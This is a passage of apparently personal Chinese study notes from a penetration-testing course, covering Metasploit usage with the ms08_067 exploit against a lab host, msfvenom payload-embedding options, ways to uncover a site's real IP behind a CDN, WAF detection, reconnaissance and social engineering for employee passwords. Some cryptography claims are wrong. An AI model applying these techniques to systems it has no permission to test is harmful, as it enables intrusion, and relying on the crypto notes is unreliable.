<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">banner   # 查看banner信息，即进入 msf 控制台时的界面</span><br><span class="line">help     # 查看帮助，英文显示 msf 支持的所有命令和作用</span><br><span class="line">exit     # 退出 msf 控制台</span><br></pre></td></tr></table></figure>

<h5 id="search模块"><a href="#search模块" class="headerlink" title="search模块"></a>search模块</h5><p><code>search 模块关键字</code> 可以查看相关的模块</p>
<p>例如:ms08_067，我们需要执行命令 <code>search 08_067</code><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf3.png"></p>
<h5 id="use-使用指定模块"><a href="#use-使用指定模块" class="headerlink" title="use 使用指定模块"></a>use 使用指定模块</h5><p>使用 ms08_067模块 ，<code>use exploit/windows/smb/ms08_067_netapi</code><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf4.png"></p>
<p>若我们在 <code>search</code> 命令后 <code>use</code> 模块，使用模块前的编号即可：<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf5.png"></p>
<h5 id="info-查看模块的详细信息"><a href="#info-查看模块的详细信息" class="headerlink" title="info 查看模块的详细信息"></a>info 查看模块的详细信息</h5><p>查看 ms08_067 模块的详细信息， <code>info exploit/windows/smb/ms08_067_netapi</code><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf6.png"></p>
<p>会显示该模块的创始人、可用目标、漏洞发现使用和模块描述等详细信息。</p>
<p>若我们在 <code>search</code> 命令之后使用 <code>info</code> 模块，也是直接使用模块前的编号即可：<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf7.png"></p>
<h5 id="back-返回msf控制台"><a href="#back-返回msf控制台" class="headerlink" title="back 返回msf控制台"></a>back 返回msf控制台</h5><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf8.png"></p>
<h5 id="show-查看"><a href="#show-查看" class="headerlink" title="show 查看"></a>show 查看</h5><p>输入 <code>show</code> 命令，查看 show 指定的参数<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf9.png"></p>
<p>show 一般来查看信息的，例如，查看所有 <code>exploit</code> 模块 <code>show exploits</code><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf10.png"></p>
<p><code>show options</code> 查看 <code>use</code> 使用模块可配置的参数<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf11.png"></p>
<p>可以看到 ms08_067 模块所需要配置的参数，其中 <code>Required</code> 为 <code>yes</code> 的是必须要配置的参数</p>
<p><code>show targets</code> 查看 ms08_067 模块可攻击目标的类型<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf12.png"></p>
<h5 id="set、setg和unset、unsetg"><a href="#set、setg和unset、unsetg" class="headerlink" title="set、setg和unset、unsetg"></a>set、setg和unset、unsetg</h5><p>set 和 setg 用法一样，setg 是对全局多有的这个参数都进行配置</p>
<p>例如我们 <code>use ms08_067</code> 模块后，<code>show option</code> 查看配置参数<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf13.png"><br><code>RHOSTS</code> 参数需要配置，使用 <code>set RHOSTS 172.16.1.105</code> 进行配置，设置了就是对 172.16.1.105 的 445 端口进行 ms08_067 进行漏洞利用<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf14.png"><br>在设置中，<code>RHOSTS</code> 是不区分大小写的，设置后使用 <code>show options</code> 查看是否配置成功<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf15.png"></p>
<p><strong><code>unset</code> 和 <code>unsetg</code> 就是不设置，一般不使用，没什么意义</strong></p>
<p>例如取消设置 <code>RHOST</code>，<code>unset RHOST</code>，（同样 <code>RHOST</code> 是不受大小写限制的）<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf16.png"></p>
<h5 id="run-和-exploit"><a href="#run-和-exploit" class="headerlink" title="run 和 exploit"></a>run 和 exploit</h5><p>这两个都是执行漏洞利用脚本，<code>run -j</code> 和 <code>exploit -j</code> 都是再次执行漏洞利用脚本<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf17.png"></p>
<h5 id="check-检查设置RHOST是否存在该漏洞"><a href="#check-检查设置RHOST是否存在该漏洞" class="headerlink" title="check 检查设置RHOST是否存在该漏洞"></a>check 检查设置RHOST是否存在该漏洞</h5><blockquote>
<p>该命令在大部分模块中不可用</p>
</blockquote>
<p>可以发现目标存在该漏洞<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf18.png"></p>
<h5 id="connect-连接端口，类似于nc连接端口一样"><a href="#connect-连接端口，类似于nc连接端口一样" class="headerlink" title="connect 连接端口，类似于nc连接端口一样"></a>connect 连接端口，类似于nc连接端口一样</h5><p>例如: <code>connect targetIP port</code><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf19.png"></p>
<h5 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h5><p><code>sessions</code> 可以查看运行的会话，一般在回去靶机权限时使用<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf20.png"></p>
<p>可以看到我们有一个会话，ID 号为 1 ，<code>sessions -i 会话号</code> 可以进入运行的会话，我们进入到会话中后终端变成了 <code>meterprete</code> 这个是 msfconsole 中的另一个后门工具，例如我们执行了 <code>getuid</code> 查看获取会话的权限<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf21.png"></p>
<h4 id="常见的参数解读"><a href="#常见的参数解读" class="headerlink" title="常见的参数解读"></a>常见的参数解读</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line"></span><br><span class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><span class="line"></span><br><span class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line"></span><br><span class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</span><br><span class="line"></span><br><span class="line">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line"></span><br><span class="line">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64</span><br><span class="line"></span><br><span class="line">–platform &lt; platform&gt; 指定payload的目标平台</span><br><span class="line"></span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line"></span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 ‘\x0f’、’\x00’;</span><br><span class="line"></span><br><span class="line">-i, –iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line"></span><br><span class="line">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line"></span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line"></span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"></span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line"></span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line"></span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line"></span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line"></span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line"></span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>



<h2 id="Day6-基础入门——加密算法（未看）。"><a href="#Day6-基础入门——加密算法（未看）。" class="headerlink" title="Day6 基础入门——加密算法（未看）。"></a>Day6 基础入门——加密算法（未看）。</h2><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><ol>
<li><p>MD5（最常见）</p>
<ul>
<li>MD5信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。</li>
<li>分类：十六位/三十二位MD5（密文位数固定不变）如：数据库密码</li>
<li>不可逆：不能直接的逆向  网上的解密不是从密文到明文的过程，而是枚举，如123的解密，是举例：1,10,11,12,13…121,122,123来匹配</li>
</ul>
</li>
<li><p>SHA</p>
<ul>
<li>安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的机率很高。</li>
<li>密文为0-9,a-z的数字组合，有四种不同的加密方式对于不同的长度</li>
</ul>
</li>
<li><p>进制</p>
<ul>
<li>二进制，十进制，十六进制</li>
</ul>
</li>
<li><p>时间戳</p>
<ul>
<li>时间戳（英文为Unix epoch, Unix time, POSIX time 或 Unix timestamp）UNIX时间戳的0按照ISO 8601规范为 ：1970-01-01T00:00:00Z.一个小时表示为UNIX时间戳格式为：3600秒；一天表示为UNIX时间戳为86400秒，闰秒不计算。</li>
<li>一般在用户的登录时间，博客的发布等等</li>
</ul>
</li>
<li><p>URL</p>
<ul>
<li>url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。</li>
<li><strong>注意：</strong>二次转码—由于空格的特殊的含义，它会进行转化，而1转化为%31的话网站会以为没有进行转码的明文，会对%31再进行一次转码—-%25%33%31—-看见%31可能会涉及二次编码。浏览器之后解密一次，二次编码多在自己关键字的绕过方面涉及</li>
</ul>
</li>
<li><p>BASE64（常用）</p>
<ul>
<li>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，基于64个可打印字符来表示二进制数据的方法。由于输出内容中包括两个以上“符号类”字符（+, /, =)，不同的应用场景又分别研制了Base64的各种“变种”。为统一和规范化Base64的输出，Base62x被视为无符号化的改进版本。</li>
<li>规律—明文有多长，密文相对有多长，0-9，a-z，且区分大小写，经常在密文后面出现等号=</li>
<li>应用—对代码，密码，参数进行编码加密，常用于web</li>
</ul>
</li>
<li><p>Unescape</p>
<ul>
<li>JavaScript unescape() 函数可对通过 escape() 编码的字符串进行解码。unescape(string)，该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码</li>
<li>特点1：以%u开始加上四位的数字</li>
<li>特点2：两个字符进行转换（最后一个除外）</li>
</ul>
</li>
<li><p>DES（类似于base64）</p>
<ul>
<li>密码学中的数据加密标准(Data Encryption Standard，DES)，是一种比较传统的加密方式，其加密运算、解密运算使用的是同样的密钥，信息的发送者和信息的接收者在进行信息的传输与处理时，必须共同持有该密码（称为对称密码），是一种对称加密算法，用一个 56 位的密钥以及附加的 8 位奇偶校验位，产生最大 64 位的分组大小。这是一个迭代的分组密码，使用称为 Feistel 的技术，其中将加密的文本块分成两半。使用子密钥对其中一半应用循环功能，然后将输出与另一半进行“异或”运算；接着交换这两半，这一过程会继续下去，但最后一个循环不交换。</li>
<li>特点：明文的长度和密文成正比，有时会出现加号</li>
</ul>
</li>
<li><p>AES（常用，md5的加强版）</p>
<ul>
<li>密码学中的高级加密标准（Advanced Encryption Standard，AES），又称Rijndael加密法，在一个4×4的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。</li>
<li>举例：明文123456，密码admin，拼接后加密，偏移量不是开始到结尾，而是从一个部分进行加密</li>
<li>将加密的用base64解密—解密为乱码多半为aes加密—有时会出现斜杠</li>
</ul>
</li>
</ol>
<p>**总结—各个加密方式的特点 **<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day6.webp"></p>
<h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><ol>
<li>直接加密<br> MD5、SHA、进制、时间戳、BASE64、unescape(除AES、DES外)</li>
<li>带 salt<br> AES</li>
<li>带密码<br> AES、DES</li>
<li>带偏移<br> AES</li>
<li>带位数</li>
<li>带模式</li>
<li>带干扰</li>
<li>自定义组合</li>
</ol>
<h3 id="常见解密方式（针对）"><a href="#常见解密方式（针对）" class="headerlink" title="常见解密方式（针对）"></a>常见解密方式（针对）</h3><ol>
<li>枚举</li>
<li>自定义逆向算法</li>
<li>可逆向</li>
</ol>
<h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><ol>
<li>长度位数</li>
<li>字符规律</li>
<li>代码分析</li>
<li>搜索获取等 </li>
</ol>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Day7-CDN绕过技术"><a href="#Day7-CDN绕过技术" class="headerlink" title="Day7 CDN绕过技术"></a>Day7 CDN绕过技术</h2><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day7-CDN.webp"></p>
<p><strong>CDN 的全称是 Content Delivery Network，即内容分发网络</strong></p>
<p>CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p>
<h3 id="如何判断目标存在CDN服务——超级ping"><a href="#如何判断目标存在CDN服务——超级ping" class="headerlink" title="如何判断目标存在CDN服务——超级ping"></a>如何判断目标存在CDN服务——超级ping</h3><p>利用多节点技术进行请求返回判断，会发现不同地区的响应 ip 不同，即存在 </p>
<h3 id="常见CDN绕过技术"><a href="#常见CDN绕过技术" class="headerlink" title="常见CDN绕过技术"></a>常见CDN绕过技术</h3><ol>
<li><p>子域名查询</p>
<p> 网站子域名如：</p>
<ul>
<li>xiaodi8.com  192.168.1.100</li>
<li><a href="http://www.xiaodi8.com/">www.xiaodi8.com</a> 192.168.1.100</li>
<li>bbs.xiaodi8.com 192.168.1.100 或 1.1-254 或在不同网段</li>
</ul>
<p> 可以循环测试区域内的不同ip来区分真实ip </p>
</li>
<li><p>邮件服务查询</p>
<p> 通过邮箱来往文件查看源代码分析找到 ip 地址</p>
</li>
<li><p>国外地址请求</p>
<p> 网站地址： <a href="https://asm.ca.com/en/ping.php%EF%BC%88%E8%A6%81%E5%9B%BD%E5%A4%96%E9%82%AE%E7%AE%B1%E6%B3%A8%E5%86%8C%EF%BC%89">https://asm.ca.com/en/ping.php（要国外邮箱注册）</a></p>
<p> 思路：在网站上面有不同的国家ip，利用这些ip访问网站，越是偏僻的国家，越可能没有部署CDN，因此，越有可能是网站的真实ip。 </p>
</li>
<li><p>遗留文件，扫描全网</p>
<p> <strong>遗留文件</strong>：谷歌搜索 <code>inurl:phpinfo.php</code> 判断脚本类型 </p>
<p> <strong>扫描全网</strong>：运用工具扫描，在不同地区的ip地址收集，再从ip地址进行分析——不可能每个地方都有cdn，偏僻地方直接访问服务器 </p>
</li>
<li><p>黑暗引擎搜索特定文件</p>
<p> 网上另类的百度谷歌，定期的将特定文件爬取到浏览器—网站可以根据ico文件hash值搜索或者MD5值 </p>
<ul>
<li>shodan</li>
<li>zoomeye</li>
<li>fofa</li>
</ul>
</li>
<li><p>dns历史记录，以量打量 </p>
<ul>
<li>查询历史记录（开始的时候没有使用cdn后面才使用）</li>
<li>DDOS攻击，由于CDN的流量限制，耗费完了之后，就是真实ip地址的服务器（不推荐）</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- xueersi </span><br><span class="line">    子域名小技巧（没加www的地址可能没做cdn服务处理可直接ping得） </span><br><span class="line">- sp910 </span><br><span class="line">    DNS历史记录</span><br><span class="line">    第三方接口（接口查询）</span><br><span class="line">- m.sp910 </span><br><span class="line">    子域名小技巧（将www改为m转为手机版网站）</span><br><span class="line">    采集（通过查询工具找到所有子域名） http://tools.bugscaner.com</span><br><span class="line">    国外(挂代理)请求（同类型访问）</span><br><span class="line">- mozhe </span><br><span class="line">    邮件源码测试对比第三方查询（地区分析）</span><br><span class="line">    验证网站IP：get-site-ip.com （作为参考）</span><br><span class="line">- xueersi </span><br><span class="line">    黑暗引擎（shodan搜指定hash文件）</span><br><span class="line">    </span><br><span class="line">扫全网</span><br><span class="line">    fuckcdn,w8fuckcdn,zmap等</span><br></pre></td></tr></table></figure>

<p>python代码——解析ico文件hash值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Python2开发环境</span><br><span class="line"># 安装mmh3失败记得先安装 Microsoft Visual C++ 14.0</span><br><span class="line"></span><br><span class="line">import mmh3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response = requests.get(&#x27;http://www.xx.com/favicon.ico&#x27;)</span><br><span class="line">favicon = response.content.encode(&#x27;base64&#x27;)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line">print &#x27;http.favicon.hash: &#x27; + str(hash)</span><br></pre></td></tr></table></figure>


<h3 id="CDN真实IP地址获取后绑定指向地址"><a href="#CDN真实IP地址获取后绑定指向地址" class="headerlink" title="CDN真实IP地址获取后绑定指向地址"></a>CDN真实IP地址获取后绑定指向地址</h3><p>更改本地hosts解析指向文件内容</p>
<h2 id="Day8-信息收集——架构、搭建、WAF等"><a href="#Day8-信息收集——架构、搭建、WAF等" class="headerlink" title="Day8 信息收集——架构、搭建、WAF等"></a>Day8 信息收集——架构、搭建、WAF等</h2><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day8.png"></p>
<h3 id="CMS-识别技术—通过CMS获取网上公开的漏洞-数据库的目录"><a href="#CMS-识别技术—通过CMS获取网上公开的漏洞-数据库的目录" class="headerlink" title="CMS 识别技术—通过CMS获取网上公开的漏洞+数据库的目录"></a>CMS 识别技术—通过CMS获取网上公开的漏洞+数据库的目录</h3><p>1. 网站下方的CMS图标</p>
<p>2. 搜索特定的ico文件—hash值与CMS指纹识别库匹配</p>
<p>3. 查看网站的搭建平台</p>
<p>4. 查看网站的开发语言的脚本框架的漏洞—网站的文件路径</p>
<p>5. 分析目录的工作原理—ip和域名的文件结构</p>
<p>6. 搜索特定的URL获取相似站点</p>
<p>7. 查看网站的响应包</p>
<h3 id="源码获取技术—白盒审计，本地安全测试，业务逻辑漏洞"><a href="#源码获取技术—白盒审计，本地安全测试，业务逻辑漏洞" class="headerlink" title="源码获取技术—白盒审计，本地安全测试，业务逻辑漏洞"></a>源码获取技术—白盒审计，本地安全测试，业务逻辑漏洞</h3><p>1. 搜索引擎搜索</p>
<p>2. 第三方源码站—站长之家，菜鸟源码</p>
<p>3. 淘宝咸鱼</p>
<p>4. 内部渠道</p>
<h3 id="架构信息获取"><a href="#架构信息获取" class="headerlink" title="架构信息获取"></a>架构信息获取</h3><p>1．Nmap扫描识别端口和OS的类型</p>
<p>2．网站区分大小写判断系统</p>
<p>3．脚本识别数据库—asp+Access；PHP+MySQL；aspx+mssql;jsp+mssql/orcale;Python+mogodb</p>
<p>4．Os识别数据库—windows才有Access+sqlserver</p>
<p>5．端口扫描—端口号对应不同的数据库</p>
<p>6．Nmap扫描第三方平台和软件—phpmyadmin</p>
<h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ol>
<li>搭建习惯-目录型站点<br> 添加目录<a href="http://www.xxx.com/yyy%E7%BD%91%E7%AB%99%E6%98%BE%E7%A4%BA%E5%86%85%E5%AE%B9%E4%B8%8D%E5%90%8C%EF%BC%88%E6%90%AD%E5%BB%BA%E6%A1%86%E6%9E%B6%E4%B8%8D%E5%90%8C%EF%BC%89%EF%BC%8C%E6%84%8F%E5%91%B3%E7%9D%80%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E4%B8%A4%E5%A5%97%E6%BC%8F%E6%B4%9E">www.xxx.com/yyy网站显示内容不同（搭建框架不同），意味着可能存在两套漏洞</a><br> 可通过随意点击或目录扫描工具发现存在目录</li>
<li>搭建习惯-端口类站点<br> 域名后加8080端口切到另一个网站，若8080端口出现漏洞，默认80端口也会受到影响</li>
<li>搭建习惯-子域名站点<br> 访问主页和子域名(两套CMS)同一个IP或同网段不同IP（子域名设置ip可以和主站相同也可不同）<br> 通过ping 网站得到IP</li>
<li>搭建习惯-类似域名站点<br> 更换cn.com.net等各种常用域名后缀发现网页logo一样内容不同<br> 可通过写脚本爆破根域名：如cn、net、com或改变顶级域名的数字如date1.com、date2.com等 </li>
<li>搭建习惯-旁注，C段站点（不推荐）<br> <img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day8-C.webp"> 扫描查询站点网站：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a> </li>
<li>搭建习惯-搭建软件特征站点<br> 中间件不同，通过关键字可以知道是什么搭建的<br> 搭建平台：宝塔、phpStudy、inmap等具有安全隐患，如phpStudy上面会有PhpMyAdmin，账号默认登录</li>
</ol>
<h3 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h3><h4 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用"></a>什么是WAF应用</h4><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day8-WAF.webp"></p>
<p><strong>Web应用防护系统</strong>（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）用户一般采用防火墙作为安第一道防线。在现实中，Web服务器和应用存在各种安全问题，普通防火墙难以检测和阻断的，由此产生了WAF。</p>
<p><strong>dns域名服务器和路由器之间，分为软件和硬件。</strong></p>
<p>Web应用防护与防火墙不同，WAF工作在<strong>应用层</strong>，对来自Web应用程序客户端的各类请求进行<strong>内容检测和验证</strong>，确保其安全性与合法性，对非法的请求予以实时<strong>阻断</strong>，从而对各类网站站点进行有效防护。</p>
<h4 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF"></a>如何快速识别WAF</h4><ol>
<li>可识别的waf的产品类型—工具识别<br> <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></li>
<li>识别网站 </li>
<li>利用浏览器抓包识别<br> X-Powered-By: WAF    （实在找不到用waf的网站）</li>
</ol>
<h4 id="识别WAF对于安全测试的意义"><a href="#识别WAF对于安全测试的意义" class="headerlink" title="识别WAF对于安全测试的意义"></a>识别WAF对于安全测试的意义</h4><ul>
<li>方便知道用那种方法绕过</li>
<li>用waf的网站不能用扫描工具扫描</li>
</ul>
<h2 id="Day9-信息收集——APP及其他资产等"><a href="#Day9-信息收集——APP及其他资产等" class="headerlink" title="Day9 信息收集——APP及其他资产等"></a>Day9 信息收集——APP及其他资产等</h2><h3 id="APP提取一键反编译提取"><a href="#APP提取一键反编译提取" class="headerlink" title="APP提取一键反编译提取"></a>APP提取一键反编译提取</h3><p>用<strong>漏了个大洞</strong>工具检测app提取url</p>
<h3 id="APP抓数据包进行工具配合"><a href="#APP抓数据包进行工具配合" class="headerlink" title="APP抓数据包进行工具配合"></a>APP抓数据包进行工具配合</h3><ol>
<li>burpsuite抓包</li>
<li>利用burp历史抓取更多URL</li>
<li>浏览器登录URL</li>
<li>发送到scan进行漏洞扫描</li>
</ol>
<h3 id="各种第三方应用相关探针技术"><a href="#各种第三方应用相关探针技术" class="headerlink" title="各种第三方应用相关探针技术"></a>各种第三方应用相关探针技术</h3><p>Nmap工具扫描</p>
<ul>
<li>各种端口一顿乱扫</li>
<li>各种接口一顿乱扫</li>
<li>接口部分一顿测试</li>
</ul>
<p>或用网站引擎搜索扫描也行：</p>
<ul>
<li>shodan.io    <ul>
<li>获取域名和端口信息</li>
</ul>
</li>
<li>zoomeye<ul>
<li>点击返回内容特殊的端口</li>
<li>通过源码查看特殊关键字</li>
<li>搜索关键字查看是否有漏洞<ul>
<li>查找的关键：数据包有回复内容，不是fileerror或者notfound </li>
</ul>
</li>
</ul>
</li>
<li>fofa.so</li>
</ul>
<p><strong>第三方扫描ip总结</strong>：  <br>扫描的IP具有多个端口，查看网站的返回，一般来说有content、HTML、link、href等且没有eror、notfound等。</p>
<h3 id="各种服务接口信息相关探针技术"><a href="#各种服务接口信息相关探针技术" class="headerlink" title="各种服务接口信息相关探针技术"></a>各种服务接口信息相关探针技术</h3><p>扫描子域名、端口<br>主站查找端口、数据库、框架漏洞<br>信息总结<br>引擎搜索子域名，查询IP和端口<br>子域名查询与爆破<br>旁注查询<br>备案信息查IP<br>主站页脚点击防伪查询接口<br>网站浏览备案域名，获取PHP探针信息<br>/robots.txt 查看文件路径，根据文件目录路径查询<br>引擎关键字查询子域名</p>
<p><strong>总结</strong>：<br>就是用前面学到的信息收集方式，把你要攻击的那个网站都扫描一遍，工具网站都行，尽可能多的收集攻击面，可以让你后面的渗透工作变得轻松。</p>
<h2 id="Day10-信息收集——资产监控拓展"><a href="#Day10-信息收集——资产监控拓展" class="headerlink" title="Day10 信息收集——资产监控拓展"></a>Day10 信息收集——资产监控拓展</h2><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><ul>
<li>便于收集整理最新 exp 或 poc</li>
<li>便于发现相关测试目标的资产</li>
</ul>
<h3 id="各种子域名查询"><a href="#各种子域名查询" class="headerlink" title="各种子域名查询"></a>各种子域名查询</h3><p>DNS、备案、证书</p>
<h3 id="全球节点请求-cdn"><a href="#全球节点请求-cdn" class="headerlink" title="全球节点请求 cdn"></a>全球节点请求 cdn</h3><ul>
<li>枚举爆破或解析子域名对应</li>
<li>便于发现管理员相关的注册信息</li>
</ul>
<h3 id="微信公众号接口获取监控实时信息"><a href="#微信公众号接口获取监控实时信息" class="headerlink" title="微信公众号接口获取监控实时信息"></a>微信公众号接口获取监控实时信息</h3><h3 id="内部群内部应用内部接口"><a href="#内部群内部应用内部接口" class="headerlink" title="内部群内部应用内部接口"></a>内部群内部应用内部接口</h3><p>社工方面了，去内部群获取资料信息，甚至内部员工默认密码，从而打入内网。</p>
